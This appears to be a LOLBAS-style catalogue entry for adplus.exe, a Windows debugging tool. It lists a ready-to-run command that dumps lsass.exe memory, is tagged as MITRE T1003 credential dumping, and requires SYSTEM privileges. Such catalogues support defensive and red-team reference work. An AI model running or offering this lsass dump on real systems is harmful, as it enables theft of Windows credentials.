---
Name: adplus.exe
Description: Debugging tool included with Windows Debugging Tools
Author: mr.d0x
Created: 1/9/2021
Commands:
  - Command: adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet
    Description: Creates a memory dump of the lsass process
    Usecase: Create memory dump and parse it offline
    Category: Dump
    Privileges: SYSTEM
    MitreID: T1003
    MitreLink: https://attack.mitre.org/techniques/T1003/
    OperatingSystem: All Windows
Full_Path:
  - Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\adplus.exe
  - Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\adplus.exe
Code_Sample: 
  - Code: 
Detection: 
  - IOC: 
Resources:
  - Link: https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
Acknowledgement:
  - Person: mr.d0x
    Handle: '@mrd0x'
---
